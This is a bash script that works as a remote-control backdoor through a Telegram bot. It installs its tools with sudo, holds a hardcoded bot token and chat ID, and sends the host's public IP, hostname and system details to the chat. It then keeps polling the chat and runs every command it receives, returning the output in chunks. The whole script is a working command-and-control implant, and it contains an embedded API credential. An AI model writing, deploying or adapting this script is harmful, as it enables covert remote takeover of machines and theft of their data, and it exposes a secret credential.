#!/bin/bash
which curl &> /dev/null || sudo apt -y install curl
which uuidgen &> /dev/null || sudo apt -y install uuid-runtime

API_KEY=1971306248:AAG6bcIM89EqqeHxHZX8fFbz_NX-ZcX7mLI
CHAT_ID=1865388145
IP=$(curl --silent ifconfig.me/ip)

if [ -f /tmp/telegram.txt ]; then
	contentFile=$(cat /tmp/telegram.txt)
fi
IFS=' : ' read gid mid <<< $contentFile

infoOS=$(uname -a)

if [ -z "$gid" ]
then
	gid=$(uuidgen)
	curl -s "https://api.telegram.org/bot$API_KEY/sendMessage?chat_id=$CHAT_ID&text=$gid :: $HOSTNAME :: $IP new connection!"
	curl --silent -G --data-urlencode "chat_id=$CHAT_ID" --data-urlencode "text=$gid :: $HOSTNAME :: $IP info : $infoOS" "https://api.telegram.org/bot$API_KEY/sendMessage"
	
else
        curl -s "https://api.telegram.org/bot$API_KEY/sendMessage?chat_id=$CHAT_ID&text=$gid :: $HOSTNAME :: $IP reconnected!"
	curl --silent -G --data-urlencode "chat_id=$CHAT_ID" --data-urlencode "text=$gid :: $HOSTNAME :: $IP info : $infoOS" "https://api.telegram.org/bot$API_KEY/sendMessage"
fi

while true
do
	result=$(curl -s https://api.telegram.org/bot$API_KEY/getUpdates)
	update_id=$(echo $result | awk -F'"update_id":' '{print substr($NF, 1, 9)}')
	if [ -z "$mid" ]
	then
		mid=$update_id
	fi
	temp_message_id=$(echo $result | awk -F'"message_id":' '{print $NF}')
	IFS=',"from":' read message_id temp <<< $temp_message_id

	if [ "$mid" != "$update_id" ]; then
		text=$(echo $result | awk -F'"text":"' '{print substr($NF, 1, length($NF) - 5)}')
		IFS=' :: ' read name tmp <<< "$text"
		task=$(echo $text | awk -F' :: ' '{print $NF}')

		if [ "$name" = "$gid" ] || [ "$name" == "all" ]; then
			message=$($task 2>&1)
			if [ -z "$message" ]
			then
				message="Task Done!"
			fi
			messagesize=${#message}
			b=0
			while [ $b -lt $messagesize ]
			do
				c=4000
				d=$((c+b))
				if [ $d -gt $messagesize ]; then
					c=$((messagesize%4000))
				fi

				curl --silent -G --data-urlencode "chat_id=$CHAT_ID" --data-urlencode "text=$gid :: $HOSTNAME :: $IP answer message : $message_id\n${message:$b:$c}" "https://api.telegram.org/bot$API_KEY/sendMessage"
				b=$((c+b))
			done
		fi
		mid=$update_id
	fi
	echo "$gid : $mid" > /tmp/telegram.txt
	sleep 120
done
